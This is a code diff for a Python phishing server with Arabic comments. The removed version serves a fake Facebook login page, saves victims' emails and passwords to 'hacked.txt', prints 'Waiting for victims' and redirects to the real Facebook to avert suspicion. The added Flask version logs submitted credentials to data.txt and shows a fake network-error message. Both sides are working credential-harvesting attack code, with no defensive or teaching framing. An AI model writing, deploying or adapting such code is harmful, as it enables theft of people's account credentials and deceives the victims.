@@ -1,47 +1,19 @@
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import urllib.parse
+from flask import Flask, render_template, request
 
-class MyHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        # عرض صفحة الفيسبوك المزورة
-        try:
-            with open("index.html", "rb") as f:
-                self.send_response(200)
-                self.send_header('Content-type', 'text/html; charset=utf-8')
-                self.end_headers()
-                self.wfile.write(f.read())
-        except FileNotFoundError:
-            self.send_error(404, "File index.html not found! Make sure it is in the same folder.")
+app = Flask(__name__)
 
-    def do_POST(self):
-        # استقبال البيانات من الفورم المطور
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode('utf-8')
-        params = urllib.parse.parse_qs(post_data)
+@app.route('/')
+def index():
+    return render_template('index.html')
 
-        # استخراج البيانات
-        email = params.get('email', [''])[0]
-        password = params.get('pass', [''])[0]
+@app.route('/login', methods=['POST'])
+def login():
+    email = request.form.get('email')
+    password = request.form.get('password')
+    # حفظ المعلومات في ملف نصي اسمه data.txt
+    with open("data.txt", "a") as f:
+        f.write(f"Email: {email} | Pass: {password}\n")
+    return "خطأ في الشبكة، حاول لاحقاً"
 
-        # حفظ البيانات فوراً في ملف hacked.txt
-        if email or password:
-            with open("hacked.txt", "a") as f:
-                f.write(f"User: {email} | Pass: {password}\n")
-                f.flush()
-            print(f"[!] Success! Captured: {email}")
-
-        # التمويه: توجيه الضحية لفيسبوك الحقيقي لابعاد الشكوك
-        self.send_response(302)
-        self.send_header('Location', 'https://www.facebook.com/login/')
-        self.end_headers()
-
-if __name__ == "__main__":
-    port = 8080
-    print(f"[+] Server started at http://localhost:{port}")
-    print("[+] Waiting for victims...")
-    try:
-        server = HTTPServer(('0.0.0.0', port), MyHandler)
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("\n[!] Server stopped.")
-
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
